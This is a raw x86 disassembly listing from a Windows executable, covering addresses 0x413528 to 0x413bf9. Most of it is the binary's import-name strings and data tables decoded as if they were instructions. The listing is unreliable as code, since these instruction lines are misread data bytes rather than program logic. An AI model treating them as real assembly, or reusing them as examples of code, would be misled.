  413528:	js     0x41359e
  41352a:	outs   dx,BYTE PTR gs:[esi]
  41352c:	je     0x41357e
  41352e:	outs   dx,DWORD PTR ds:[esi]
  41352f:	imul   ebp,DWORD PTR [esi+0x74],0x573233
  413536:	jo     0x413538
  413538:	inc    ecx
  413539:	fs fs inc esi
  41353c:	outs   dx,DWORD PTR ds:[esi]
  41353d:	outs   dx,BYTE PTR ds:[esi]
  41353e:	je     0x413592
  413540:	gs jae 0x4135b2
  413543:	jne    0x4135b7
  413545:	arpl   WORD PTR [ebp+0x57],sp
  413548:	add    BYTE PTR [eax],al
  41354a:	inc    ecx
  41354b:	add    DWORD PTR [edi+0x65],eax
  41354e:	je     0x413594
  413550:	gs jbe 0x4135bc
  413553:	arpl   WORD PTR [ebp+0x43],sp
  413556:	popa   
  413557:	jo     0x4135cc
  413559:	add    BYTE PTR [esi+0x1],ch
  41355c:	inc    edi
  41355d:	gs je  0x4135b0
  413560:	imul   edi,DWORD PTR [eax+0x65],0xd500006c
  413567:	add    BYTE PTR [ebp+0x78],al
  41356a:	je     0x4135c0
  41356c:	gs js  0x4135e3
  41356f:	dec    edi
  413570:	jne    0x4135e6
  413572:	push   edi
  413573:	add    BYTE PTR [esi+0x65724300],ah
  413579:	popa   
  41357a:	je     0x4135e1
  41357c:	push   eax
  41357d:	popa   
  41357e:	je     0x4135f4
  413580:	gs jb  0x4135f1
  413583:	inc    edx
  413584:	jb     0x4135fb
  413586:	jae    0x4135f0
  413588:	add    BYTE PTR [eax],al
  41358a:	into   
  41358b:	add    BYTE PTR [ebp+0x78],al
  41358e:	arpl   WORD PTR [ebp+esi*2+0x64],bp
  413592:	gs inc ebx
  413594:	ins    BYTE PTR es:[edi],dx
  413595:	imul   esi,DWORD PTR [eax+0x52],0x746365
  41359c:	lds    eax,FWORD PTR [eax]
  41359e:	inc    ebp
  41359f:	outs   dx,BYTE PTR ds:[esi]
  4135a0:	jne    0x41360f
  4135a2:	inc    esi
  4135a3:	outs   dx,DWORD PTR ds:[esi]
  4135a4:	outs   dx,BYTE PTR ds:[esi]
  4135a5:	je     0x4135ed
  4135a7:	popa   
  4135a8:	ins    DWORD PTR es:[edi],dx
  4135a9:	imul   ebp,DWORD PTR [ecx+ebp*2+0x65],0x47005773
  4135b1:	inc    esp
  4135b2:	dec    ecx
  4135b3:	xor    esi,DWORD PTR [edx]
  4135b5:	cs fs ins BYTE PTR es:[edi],dx
  4135b8:	ins    BYTE PTR es:[edi],dx
  4135b9:	add    BYTE PTR [edi+0x74654701],bl
  4135bf:	inc    ebx
  4135c0:	outs   dx,DWORD PTR ds:[esi]
  4135c1:	ins    DWORD PTR es:[edi],dx
  4135c2:	jo     0x413639
  4135c4:	je     0x41362b
  4135c6:	jb     0x413616
  4135c8:	popa   
  4135c9:	ins    DWORD PTR es:[edi],dx
  4135ca:	gs inc ecx
  4135cc:	add    BYTE PTR [eax],al
  4135ce:	sbb    eax,0x74655304
  4135d3:	dec    eax
  4135d4:	popa   
  4135d5:	outs   dx,BYTE PTR ds:[esi]
  4135d6:	fs ins BYTE PTR es:[edi],dx
  4135d8:	gs inc ebx
  4135da:	outs   dx,DWORD PTR ds:[esi]
  4135db:	jne    0x41364b
  4135dd:	je     0x4135df
  4135df:	add    BYTE PTR [edx],bh
  4135e1:	add    ecx,DWORD PTR [edi+0x70]
  4135e4:	outs   dx,BYTE PTR gs:[esi]
  4135e6:	inc    esi
  4135e7:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x4300f200
  4135ef:	jb     0x413656
  4135f1:	popa   
  4135f2:	je     0x413659
  4135f4:	push   edi
  4135f5:	popa   
  4135f6:	imul   esi,DWORD PTR [ecx+eiz*2+0x62],0x6954656c
  4135fe:	ins    DWORD PTR es:[edi],dx
  4135ff:	gs jb  0x413643
  413602:	add    BYTE PTR [eax],al
  413604:	and    al,0x3
  413606:	dec    ebp
  413607:	popa   
  413608:	jo     0x413660
  41360a:	imul   esp,DWORD PTR [ebp+0x77],0x6946664f
  413611:	ins    BYTE PTR es:[edi],dx
  413612:	add    BYTE PTR gs:[esp+eax*1],bh
  413616:	push   ebx
  413617:	gs je  0x41366e
  41361a:	push   0x64616572
  41361f:	push   eax
  413620:	jb     0x41368b
  413622:	outs   dx,DWORD PTR ds:[esi]
  413623:	jb     0x41368e
  413625:	je     0x4136a0
  413627:	add    BYTE PTR [edx+0x6f6c4702],dl
  41362d:	bound  esp,QWORD PTR [ecx+0x6c]
  413630:	inc    edi
  413631:	gs je  0x413675
  413634:	je     0x4136a5
  413636:	ins    DWORD PTR es:[edi],dx
  413637:	dec    esi
  413638:	popa   
  413639:	ins    DWORD PTR es:[edi],dx
  41363a:	gs push edi
  41363c:	add    BYTE PTR [eax],al
  41363e:	retf   
  41363f:	add    cl,BYTE PTR [ecx+0x73]
  413642:	inc    edx
  413643:	popa   
  413644:	fs push edx
  413646:	gs popa 
  413648:	fs push eax
  41364a:	je     0x4136be
  41364c:	add    BYTE PTR [eax],al
  41364e:	or     BYTE PTR [ecx],al
  413650:	inc    esp
  413651:	gs jbe 0x4136bd
  413654:	arpl   WORD PTR [ebp+0x49],sp
  413657:	outs   dx,DWORD PTR ds:[esi]
  413658:	inc    ebx
  413659:	outs   dx,DWORD PTR ds:[esi]
  41365a:	outs   dx,BYTE PTR ds:[esi]
  41365b:	je     0x4136cf
  41365d:	outs   dx,DWORD PTR ds:[esi]
  41365e:	ins    BYTE PTR es:[edi],dx
  41365f:	add    BYTE PTR [ecx+0x1],bl
  413662:	inc    esi
  413663:	imul   ebp,DWORD PTR [esi+0x64],0x736f6c43
  41366a:	add    BYTE PTR gs:[edx],cl
  41366d:	add    al,BYTE PTR [edi+0x65]
  413670:	je     0x4136bf
  413672:	outs   dx,DWORD PTR ds:[esi]
  413673:	fs jne 0x4136e2
  413676:	gs dec eax
  413678:	popa   
  413679:	outs   dx,BYTE PTR ds:[esi]
  41367a:	fs ins BYTE PTR es:[edi],dx
  41367c:	gs inc ecx
  41367e:	add    BYTE PTR [eax],al
  413680:	inc    edx
  413681:	add    DWORD PTR [esi+0x69],eax
  413684:	outs   dx,BYTE PTR ds:[esi]
  413685:	fs dec esi
  413687:	gs js  0x4136fe
  41368a:	inc    ebx
  41368b:	push   0x65676e61
  413690:	dec    esi
  413691:	outs   dx,DWORD PTR ds:[esi]
  413692:	je     0x4136fd
  413694:	imul   sp,WORD PTR [ebx+0x61],0x6974
  41369a:	outs   dx,DWORD PTR ds:[esi]
  41369b:	outs   dx,BYTE PTR ds:[esi]
  41369c:	add    BYTE PTR [eax],al
  41369e:	xor    eax,0x74655304
  4136a3:	push   esp
  4136a4:	push   0x64616572
  4136a9:	inc    ecx
  4136aa:	data16 imul bp,WORD PTR [esi+0x69],0x7974
  4136b1:	dec    ebp
  4136b2:	popa   
  4136b3:	jae    0x413720
  4136b5:	add    BYTE PTR [esi],bl
  4136b7:	add    al,BYTE PTR [edi+0x65]
  4136ba:	je     0x41370c
  4136bc:	jb     0x413727
  4136be:	outs   dx,DWORD PTR ds:[esi]
  4136bf:	jb     0x41372a
  4136c1:	je     0x41373c
  4136c3:	inc    ebx
  4136c4:	ins    BYTE PTR es:[edi],dx
  4136c5:	popa   
  4136c6:	jae    0x41373b
  4136c8:	add    BYTE PTR [eax],al
  4136ca:	sti    
  4136cb:	add    DWORD PTR [edi+0x65],eax
  4136ce:	je     0x41371c
  4136d0:	popa   
  4136d1:	jae    0x413747
  4136d3:	inc    ebp
  4136d4:	jb     0x413748
  4136d6:	outs   dx,DWORD PTR ds:[esi]
  4136d7:	jb     0x4136d9
  4136d9:	add    BYTE PTR [edi],dl
  4136db:	add    ecx,DWORD PTR [edi+ebp*2+0x63]
  4136df:	imul   eax,DWORD PTR [esi+0x69],0x6c
  4136e3:	add    BYTE PTR gs:[eax],al
  4136e6:	retf   
  4136e7:	add    DWORD PTR [edi+0x65],eax
  4136ea:	je     0x41372f
  4136ec:	jne    0x413760
  4136ee:	jb     0x413755
  4136f0:	outs   dx,BYTE PTR ds:[esi]
  4136f1:	je     0x413737
  4136f3:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  4136fa:	jns    0x413753
  4136fc:	add    BYTE PTR [eax],al
  4136fe:	mov    BYTE PTR [eax],al
  413700:	inc    ecx
  413701:	jb     0x413768
  413703:	inc    esi
  413704:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x41736970
  41370c:	dec    esi
  41370d:	push   ebx
  41370e:	dec    ecx
  41370f:	add    BYTE PTR ds:0x74655304,ah
  413715:	dec    ebp
  413716:	popa   
  413717:	imul   ebp,DWORD PTR [ebx+esi*2+0x6c],0x6e49746f
  41371f:	outs   dx,WORD PTR ds:[esi]
  413721:	add    dl,cl
  413723:	add    BYTE PTR [ebx+0x72],al
  413726:	gs popa 
  413728:	je     0x41378f
  41372a:	inc    ebp
  41372b:	jbe    0x413792
  41372d:	outs   dx,BYTE PTR ds:[esi]
  41372e:	je     0x413771
  413730:	add    BYTE PTR [eax],al
  413732:	outs   dx,BYTE PTR ds:[esi]
  413733:	add    DWORD PTR [esi+0x69],eax
  413736:	outs   dx,BYTE PTR ds:[esi]
  413737:	fs push edx
  413739:	gs jae 0x4137ab
  41373c:	jne    0x4137b0
  41373e:	arpl   WORD PTR [ebp+0x45],sp
  413741:	js     0x41379a
  413743:	add    BYTE PTR [eax+0x3],bh
  413746:	push   edx
  413747:	gs popa 
  413749:	fs inc esi
  41374b:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x47026100
  413753:	gs je  0x4137aa
  413756:	gs ins DWORD PTR es:[edi],dx
  413758:	jo     0x4137aa
  41375a:	popa   
  41375b:	je     0x4137c5
  41375d:	inc    ecx
  41375e:	add    BYTE PTR [eax],al
  413760:	mov    DWORD PTR [edx],eax
  413762:	inc    edi
  413763:	ins    BYTE PTR es:[edi],dx
  413764:	outs   dx,DWORD PTR ds:[esi]
  413765:	bound  esp,QWORD PTR [ecx+0x6c]
  413768:	inc    ecx
  413769:	ins    BYTE PTR es:[edi],dx
  41376a:	ins    BYTE PTR es:[edi],dx
  41376b:	outs   dx,DWORD PTR ds:[esi]
  41376c:	arpl   WORD PTR [eax],ax
  41376e:	xchg   esp,eax
  41376f:	add    al,0x57
  413771:	imul   ebp,DWORD PTR [esi+0x45],0x636578
  413778:	bound  eax,QWORD PTR [edx]
  41377a:	inc    edi
  41377b:	gs je  0x4137d2
  41377e:	gs ins DWORD PTR es:[edi],dx
  413780:	jo     0x4137d2
  413782:	popa   
  413783:	je     0x4137ed
  413785:	push   edi
  413786:	add    BYTE PTR [eax],al
  413788:	rol    BYTE PTR [eax],1
  41378a:	inc    ebx
  41378b:	jb     0x4137f2
  41378d:	popa   
  41378e:	je     0x4137f5
  413790:	inc    esi
  413791:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x47026700
  413799:	gs je  0x4137f0
  41379c:	push   0x64616572
  4137a1:	dec    esp
  4137a2:	outs   dx,DWORD PTR ds:[esi]
  4137a3:	arpl   WORD PTR [ecx+0x6c],sp
  4137a6:	add    BYTE PTR gs:[eax],ah
  4137a9:	add    DWORD PTR [ebp+0x6e],eax
  4137ac:	jne    0x41381b
  4137ae:	push   edx
  4137af:	gs jae 0x413821
  4137b2:	jne    0x413826
  4137b4:	arpl   WORD PTR [ebp+0x4e],sp
  4137b7:	popa   
  4137b8:	ins    DWORD PTR es:[edi],dx
  4137b9:	gs jae 0x4137fd
  4137bc:	add    BYTE PTR [eax],al
  4137be:	repz add DWORD PTR [edi+0x65],eax
  4137c2:	je     0x41380a
  4137c4:	jne    0x413832
  4137c6:	ins    BYTE PTR es:[edi],dx
  4137c7:	push   eax
  4137c8:	popa   
  4137c9:	je     0x413833
  4137cb:	dec    esi
  4137cc:	popa   
  4137cd:	ins    DWORD PTR es:[edi],dx
  4137ce:	gs push edi
  4137d0:	add    BYTE PTR [eax],al
  4137d2:	push   eax
  4137d3:	add    DWORD PTR [esi+0x69],eax
  4137d6:	ins    BYTE PTR es:[edi],dx
  4137d7:	gs push esp
  4137d9:	imul   ebp,DWORD PTR [ebp+0x65],0x79536f54
  4137e0:	jae    0x413856
  4137e2:	gs ins DWORD PTR es:[edi],dx
  4137e4:	push   esp
  4137e5:	imul   ebp,DWORD PTR [ebp+0x65],0xe60000
  4137ec:	inc    ebx
  4137ed:	jb     0x413854
  4137ef:	popa   
  4137f0:	je     0x413857
  4137f2:	push   edx
  4137f3:	gs ins DWORD PTR es:[edi],dx
  4137f5:	outs   dx,DWORD PTR ds:[esi]
  4137f6:	je     0x41385d
  4137f8:	push   esp
  4137f9:	push   0x64616572
  4137fe:	add    BYTE PTR [eax],al
  413800:	jns    0x413804
  413802:	inc    edi
  413803:	gs je  0x41385c
  413806:	gs jb  0x41387c
  413809:	imul   ebp,DWORD PTR [edi+0x6e],0x1010000
  413810:	inc    esp
  413811:	gs ins BYTE PTR es:[edi],dx
  413813:	gs je  0x41387b
  413816:	inc    ebx
  413817:	jb     0x413882
  413819:	je     0x413884
  41381b:	arpl   WORD PTR [ecx+0x6c],sp
  41381e:	push   ebx
  41381f:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  413824:	outs   dx,BYTE PTR ds:[esi]
  413825:	add    BYTE PTR [ecx],cl
  413827:	add    al,BYTE PTR [edi+0x65]
  41382a:	je     0x413879
  41382c:	outs   dx,DWORD PTR ds:[esi]
  41382d:	fs jne 0x41389c
  413830:	gs inc esi
  413832:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x57656d61
  41383a:	add    BYTE PTR [eax],al
  41383c:	dec    edi
  41383d:	add    al,0x53
  41383f:	jne    0x4138b4
  413841:	jo     0x4138a8
  413843:	outs   dx,BYTE PTR ds:[esi]
  413844:	fs push esp
  413846:	push   0x64616572
  41384b:	add    ah,cl
  41384d:	add    al,0x6c
  41384f:	jae    0x4138c5
  413851:	jb     0x4138b6
  413853:	jo     0x4138ce
  413855:	outs   dx,BYTE PTR ds:[esi]
  413856:	push   edi
  413857:	add    bh,dh
  413859:	add    DWORD PTR [edi+0x65],eax
  41385c:	je     0x4138a6
  41385e:	popa   
  41385f:	outs   dx,BYTE PTR ds:[esi]
  413860:	fs ins BYTE PTR es:[edi],dx
  413862:	gs dec ecx
  413864:	outs   dx,BYTE PTR ds:[esi]
  413865:	outs   dx,WORD PTR ds:[esi]
  413867:	jb     0x4138d6
  413869:	popa   
  41386a:	je     0x4138d5
  41386c:	outs   dx,DWORD PTR ds:[esi]
  41386d:	outs   dx,BYTE PTR ds:[esi]
  41386e:	add    BYTE PTR [eax],al
  413870:	or     eax,DWORD PTR [ebx]
  413872:	dec    esp
  413873:	outs   dx,DWORD PTR ds:[esi]
  413874:	arpl   WORD PTR [ecx+0x6c],sp
  413877:	inc    ecx
  413878:	ins    BYTE PTR es:[edi],dx
  413879:	ins    BYTE PTR es:[edi],dx
  41387a:	outs   dx,DWORD PTR ds:[esi]
  41387b:	arpl   WORD PTR [eax],ax
  41387d:	add    BYTE PTR [ebx+0x2],ah
  413880:	inc    edi
  413881:	gs je  0x4138d8
  413884:	push   0x64616572
  413889:	inc    ebx
  41388a:	outs   dx,DWORD PTR ds:[esi]
  41388b:	outs   dx,BYTE PTR ds:[esi]
  41388c:	je     0x4138f3
  41388e:	js     0x413904
  413890:	add    BYTE PTR [eax],al
  413892:	ret    
  413893:	add    edx,DWORD PTR [edx+0x74]
  413896:	ins    BYTE PTR es:[edi],dx
  413897:	push   ebp
  413898:	outs   dx,BYTE PTR ds:[esi]
  413899:	ja     0x413904
  41389b:	outs   dx,BYTE PTR ds:[esi]
  41389c:	add    BYTE PTR fs:[ecx+eax*1+0x41746547],cl
  4138a4:	je     0x413915
  4138a6:	ins    DWORD PTR es:[edi],dx
  4138a7:	dec    esi
  4138a8:	popa   
  4138a9:	ins    DWORD PTR es:[edi],dx
  4138aa:	gs push edi
  4138ac:	add    BYTE PTR [eax],al
  4138ae:	jmp    0x6946:0x74654701
  4138b5:	ins    BYTE PTR es:[edi],dx
  4138b6:	gs inc ecx
  4138b8:	je     0x41392e
  4138ba:	jb     0x413925
  4138bc:	bound  esi,QWORD PTR [ebp+0x74]
  4138bf:	gs jae 0x413907
  4138c2:	js     0x413905
  4138c4:	add    BYTE PTR [eax],al
  4138c6:	inc    edx
  4138c7:	add    al,BYTE PTR [edi+0x65]
  4138ca:	je     0x41391f
  4138cc:	push   0x5074726f
  4138d1:	popa   
  4138d2:	je     0x41393c
  4138d4:	dec    esi
  4138d5:	popa   
  4138d6:	ins    DWORD PTR es:[edi],dx
  4138d7:	gs inc ecx
  4138d9:	add    bl,bl
  4138db:	add    edx,DWORD PTR [ebx+0x65]
  4138de:	popa   
  4138df:	jb     0x413944
  4138e1:	push   0x68746150
  4138e6:	inc    ecx
  4138e7:	add    BYTE PTR [eax+0x4],al
  4138ea:	push   ebx
  4138eb:	gs je  0x413942
  4138ee:	imul   ebp,DWORD PTR [ebp+0x65],0x65755172
  4138f5:	jne    0x41395c
  4138f7:	push   esp
  4138f8:	imul   ebp,DWORD PTR [ebp+0x65],0xb4000072
  4138ff:	add    edx,DWORD PTR [edx+0x65]
  413902:	ins    DWORD PTR es:[edi],dx
  413903:	outs   dx,DWORD PTR ds:[esi]
  413904:	jbe    0x41396b
  413906:	inc    esp
  413907:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  41390e:	jns    0x413967
  413910:	add    BYTE PTR [eax],al
  413912:	ret    
  413913:	add    al,0x6c
  413915:	jae    0x41398b
  413917:	jb     0x41397c
  413919:	ins    DWORD PTR es:[edi],dx
  41391a:	jo     0x413973
  41391c:	add    BYTE PTR [eax],al
  41391e:	dec    edi
  41391f:	add    DWORD PTR [esi+0x69],eax
  413922:	ins    BYTE PTR es:[edi],dx
  413923:	gs push esp
  413925:	imul   ebp,DWORD PTR [ebp+0x65],0x6f4c6f54
  41392c:	arpl   WORD PTR [ecx+0x6c],sp
  41392f:	inc    esi
  413930:	imul   ebp,DWORD PTR [ebp+eiz*2+0x54],0x656d69
  413938:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413939:	add    BYTE PTR [ebx+0x61],al
  41393c:	outs   dx,BYTE PTR ds:[esi]
  41393d:	arpl   WORD PTR [ebp+0x6c],sp
  413940:	push   edi
  413941:	popa   
  413942:	imul   esi,DWORD PTR [ecx+eiz*2+0x62],0x6954656c
  41394a:	ins    DWORD PTR es:[edi],dx
  41394b:	gs jb  0x41394e
  41394e:	dec    ebx
  41394f:	inc    ebp
  413950:	push   edx
  413951:	dec    esi
  413952:	inc    ebp
  413953:	dec    esp
  413954:	xor    esi,DWORD PTR [edx]
  413956:	cs fs ins BYTE PTR es:[edi],dx
  413959:	ins    BYTE PTR es:[edi],dx
  41395a:	add    BYTE PTR [eax],al
  41395c:	inc    esi
  41395d:	add    BYTE PTR [eax+0x61],dl
  413960:	je     0x4139ca
  413962:	inc    esi
  413963:	imul   ebp,DWORD PTR [esi+0x64],0x65747845
  41396a:	outs   dx,BYTE PTR ds:[esi]
  41396b:	jae    0x4139d6
  41396d:	outs   dx,DWORD PTR ds:[esi]
  41396e:	outs   dx,BYTE PTR ds:[esi]
  41396f:	inc    ecx
  413970:	add    BYTE PTR [eax],al
  413972:	inc    edi
  413973:	add    BYTE PTR [eax+0x61],dl
  413976:	je     0x4139e0
  413978:	inc    esi
  413979:	imul   ebp,DWORD PTR [esi+0x64],0x65747845
  413980:	outs   dx,BYTE PTR ds:[esi]
  413981:	jae    0x4139ec
  413983:	outs   dx,DWORD PTR ds:[esi]
  413984:	outs   dx,BYTE PTR ds:[esi]
  413985:	push   edi
  413986:	add    BYTE PTR [eax],al
  413988:	push   ebx
  413989:	dec    eax
  41398a:	dec    esp
  41398b:	push   edi
  41398c:	inc    ecx
  41398d:	push   eax
  41398e:	dec    ecx
  41398f:	cs fs ins BYTE PTR es:[edi],dx
  413992:	ins    BYTE PTR es:[edi],dx
  413993:	add    BYTE PTR [ebx+0x46],dh
  413996:	addr16 popa 
  413998:	pop    ecx
  413999:	dec    ebp
  41399a:	popa   
  41399b:	jns    0x4139f1
  41399d:	push   ecx
  41399e:	imul   ebp,DWORD PTR [ebx+0x74],0x78
  4139a2:	je     0x413a05
  4139a4:	inc    ebx
  4139a5:	push   ecx
  4139a6:	ins    BYTE PTR es:[edi],dx
  4139a7:	pop    eax
  4139a8:	add    BYTE PTR [eax],al
  4139aa:	add    BYTE PTR [eax],al
  4139ac:	or     al,0x3e
  4139ae:	inc    ecx
  4139af:	add    BYTE PTR [esi+edi*1],dl
  4139b2:	inc    ecx
  4139b3:	add    ah,dh
  4139b5:	cmp    eax,DWORD PTR [ecx+0x0]
  4139b8:	call   0x794febc8
  4139bd:	dec    edi
  4139be:	ret    0x774e
  4139c1:	dec    edi
  4139c2:	cmp    eax,0x384f4f4f
  4139c7:	dec    edi
  4139c8:	jp     0x413a19
  4139ca:	cmp    ecx,DWORD PTR [edi+0x5e]
  4139cd:	dec    edi
  4139ce:	ss dec edi
  4139d0:	add    ecx,DWORD PTR [edi+0x31]
  4139d3:	dec    edi
  4139d4:	ret    0x324e
  4139d7:	dec    edi
  4139d8:	push   ds
  4139d9:	push   edx
  4139da:	pop    ds
  4139db:	push   ebx
  4139dc:	cmp    DWORD PTR [edi+0x79],ecx
  4139df:	dec    edi
  4139e0:	ret    0x774e
  4139e3:	dec    edi
  4139e4:	cmp    eax,0x384f4f4f
  4139e9:	dec    edi
  4139ea:	jp     0x413a3b
  4139ec:	cmp    ecx,DWORD PTR [edi+0x5e]
  4139ef:	dec    edi
  4139f0:	ss dec edi
  4139f2:	imul   ecx,DWORD PTR [edi+0x31],0x324ec24f
  4139f9:	dec    edi
  4139fa:	push   ds
  4139fb:	bound  ebx,QWORD PTR [edi]
  4139fd:	arpl   WORD PTR [ecx],di
  4139ff:	dec    edi
  413a00:	jns    0x413a51
  413a02:	ret    0x724e
  413a05:	dec    edi
  413a06:	cmp    eax,0x394f034f
  413a0b:	dec    edi
  413a0c:	dec    esp
  413a0d:	dec    edi
  413a0e:	xor    al,0x4f
  413a10:	ret    0x304e
  413a13:	dec    edi
  413a14:	push   ds
  413a15:	jb     0x413a36
  413a17:	jae    0x413a28
  413a19:	or     DWORD PTR [eax],0xffffff80
  413a1c:	js     0x4139ae
  413a1e:	jns    0x4139b1
  413a20:	aas    
  413a21:	dec    edi
  413a22:	jbe    0x413a73
  413a24:	ret    0x764e
  413a27:	dec    edi
  413a28:	ds dec edi
  413a2a:	dec    esp
  413a2b:	dec    edi
  413a2c:	cmp    DWORD PTR [edi+0x3],ecx
  413a2f:	dec    edi
  413a30:	xor    eax,0x364ec24f
  413a35:	dec    edi
  413a36:	push   ds
  413a37:	sbb    BYTE PTR [edi],0x83
  413a3a:	setae  BYTE PTR [eax]
  413a3d:	nop
  413a3e:	js     0x4139e0
  413a40:	jns    0x4139e3
  413a42:	aas    
  413a43:	dec    edi
  413a44:	jbe    0x413a95
  413a46:	ret    0x764e
  413a49:	dec    edi
  413a4a:	ds dec edi
  413a4c:	dec    esp
  413a4d:	dec    edi
  413a4e:	cmp    DWORD PTR [edi+0x69],ecx
  413a51:	dec    edi
  413a52:	xor    eax,0x364ec24f
  413a57:	dec    edi
  413a58:	push   ds
  413a59:	xchg   edx,eax
  413a5a:	pop    ds
  413a5b:	xchg   ebx,eax
  413a5c:	bt     DWORD PTR [eax],ecx
  413a5f:	mov    al,ds:0xb179b078
  413a64:	aas    
  413a65:	dec    edi
  413a66:	push   0x4e4ec24f
  413a6b:	dec    edi
  413a6c:	cmp    eax,0x394f034f
  413a71:	dec    edi
  413a72:	push   ecx
  413a73:	dec    edi
  413a74:	xor    al,0x4f
  413a76:	ret    0x364e
  413a79:	dec    edi
  413a7a:	push   ds
  413a7b:	mov    ds:0xb30fa31f,al
  413a80:	or     BYTE PTR [eax-0x3e863f88],dh
  413a86:	aas    
  413a87:	dec    edi
  413a88:	push   0x4e4ec24f
  413a8d:	dec    edi
  413a8e:	cmp    eax,0x394f784f
  413a93:	dec    edi
  413a94:	pop    edi
  413a95:	dec    edi
  413a96:	cmp    ecx,DWORD PTR [edi-0x3e]
  413a99:	dec    esi
  413a9a:	xor    eax,0x1fb21e4f
  413a9f:	mov    bl,0xf
  413aa1:	ret    
  413aa2:	or     al,al
  413aa4:	js     0x413a76
  413aa6:	jns    0x413a79
  413aa8:	aas    
  413aa9:	dec    edi
  413aaa:	push   0x4e4ec24f
  413aaf:	dec    edi
  413ab0:	cmp    eax,0x394f724f
  413ab5:	dec    edi
  413ab6:	dec    esi
  413ab7:	dec    edi
  413ab8:	xor    al,0x4f
  413aba:	ret    0x304e
  413abd:	dec    edi
  413abe:	push   ds
  413abf:	ret    0xc31f
  413ac2:	psrlq  mm1,QWORD PTR [eax]
  413ac5:	sar    BYTE PTR [eax-0x20],1
  413ac8:	jns    0x413aab
  413aca:	aas    
  413acb:	dec    edi
  413acc:	push   0x4e4ec24f
  413ad1:	dec    edi
  413ad2:	cmp    eax,0x394f734f
  413ad7:	dec    edi
  413ad8:	dec    esp
  413ad9:	dec    edi
  413ada:	xor    al,0x4f
  413adc:	ret    0x364e
  413adf:	dec    edi
  413ae0:	push   ds
  413ae1:	rcr    BYTE PTR [edi],cl
  413ae3:	ror    DWORD PTR [edi],cl
  413ae5:	jecxz  0x413aef
  413ae7:	loopne 0x413b61
  413ae9:	lock jns 0x413add
  413aec:	aas    
  413aed:	dec    edi
  413aee:	ins    DWORD PTR es:[edi],dx
  413aef:	dec    edi
  413af0:	ret    0x5f4e
  413af3:	dec    edi
  413af4:	cmp    eax,0x3e4f524f
  413af9:	dec    edi
  413afa:	ret    0x3f4e
  413afd:	dec    edi
  413afe:	push   ds
  413aff:	loop   0x413b20
  413b01:	jecxz  0x413b12
  413b03:	repz or al,dh
  413b06:	js     0x413b08
  413b08:	jns    0x413b0b
  413b0a:	js     0x413b1c
  413b0c:	jns    0x413b1f
  413b0e:	ds dec edi
  413b10:	jg     0x413b61
  413b12:	ret    0x5b4e
  413b15:	dec    edi
  413b16:	cmp    al,0x4f
  413b18:	jb     0x413b69
  413b1a:	ds dec edi
  413b1c:	dec    ebp
  413b1d:	dec    edi
  413b1e:	cmp    ecx,DWORD PTR [edi-0x3e]
  413b21:	dec    esi
  413b22:	xor    eax,0x1f021e4f
  413b27:	add    ecx,DWORD PTR [edi]
  413b29:	adc    ecx,DWORD PTR [eax]
  413b2b:	adc    BYTE PTR [eax+0x20],bh
  413b2e:	jns    0x413b51
  413b30:	aas    
  413b31:	dec    edi
  413b32:	add    BYTE PTR [eax],al
  413b34:	mov    esp,0xb0004139
  413b39:	cmp    eax,DWORD PTR [ecx+0x0]
  413b3c:	mov    eax,0x1800413b
  413b41:	ds inc ecx
  413b43:	add    BYTE PTR [ebp+edi*1+0x41],bh
  413b47:	add    BYTE PTR [eax],cl
  413b49:	ds inc ecx
  413b4b:	add    BYTE PTR [eax-0x63ffbec5],bl
  413b51:	cmp    eax,DWORD PTR [ecx+0x0]
  413b54:	add    BYTE PTR [esi],bh
  413b56:	inc    ecx
  413b57:	add    BYTE PTR [eax],al
  413b59:	cmp    al,0x41
  413b5b:	add    BYTE PTR [edx-0x4e076357],cl
  413b61:	mov    edx,0x3bb4f89c
  413b66:	inc    ecx
  413b67:	add    BYTE PTR [eax],bh
  413b69:	cmp    eax,0x3d4c0041
  413b6e:	inc    ecx
  413b6f:	add    BYTE PTR [eax+0x3d],bl
  413b72:	inc    ecx
  413b73:	add    BYTE PTR [eax+0x3d],ch
  413b76:	inc    ecx
  413b77:	add    ah,ch
  413b79:	cmp    eax,DWORD PTR [ecx+0x0]
  413b7c:	mov    eax,0xc004139
  413b81:	cmp    al,0x41
  413b83:	add    ah,bh
  413b85:	cmp    eax,DWORD PTR [ecx+0x0]
  413b88:	sbb    al,0x3e
  413b8a:	inc    ecx
  413b8b:	add    BYTE PTR [ecx],dh
  413b8d:	test   DWORD PTR [eax+edi*8-0x7ee8f462],ebx
  413b94:	sar    BYTE PTR [ebx],0x41
  413b97:	add    BYTE PTR [ebx-0x707ee9e4],dl
  413b9d:	or     eax,0x705
  413ba2:	inc    eax
  413ba3:	add    BYTE PTR [ebp+ebx*8-0x6c],al
  413ba7:	fnsave [edi+0x36]
  413baa:	inc    ebx
  413bab:	add    BYTE PTR [edx+0x68],dh
  413bae:	inc    ebp
  413baf:	inc    ecx
  413bb0:	(bad)  
  413bb1:	cli    
  413bb2:	jne    0x413c16
  413bb4:	(bad)  
  413bb5:	in     eax,dx
  413bb6:	inc    BYTE PTR [edi]
  413bb8:	mov    eax,0xa805a3fa
  413bbd:	cmp    eax,DWORD PTR [ecx+0x0]
  413bc0:	xor    dl,BYTE PTR [ebp-0x69cd0764]
  413bc6:	pushf  
  413bc7:	clc    
  413bc8:	xor    edx,DWORD PTR [ebp-0x6ac30764]
  413bce:	pushf  
  413bcf:	clc    
  413bd0:	cmp    eax,0x3ef89c95
  413bd5:	xchg   ebp,eax
  413bd6:	pushf  
  413bd7:	clc    
  413bd8:	aas    
  413bd9:	xchg   ebp,eax
  413bda:	pushf  
  413bdb:	clc    
  413bdc:	cmp    BYTE PTR [ebp-0x6ac60764],dl
  413be2:	pushf  
  413be3:	clc    
  413be4:	cmp    dl,BYTE PTR [ebp-0x6ade0764]
  413bea:	pushf  
  413beb:	clc    
  413bec:	in     eax,dx
  413bed:	stc    
  413bee:	add    esp,DWORD PTR [eax-0x50]
  413bf1:	cmp    DWORD PTR [ecx+0x0],eax
  413bf4:	hlt    
  413bf5:	add    BYTE PTR [ebx+0x0],al
  413bf8:	pop    ecx
  413bf9:	dec    ecx
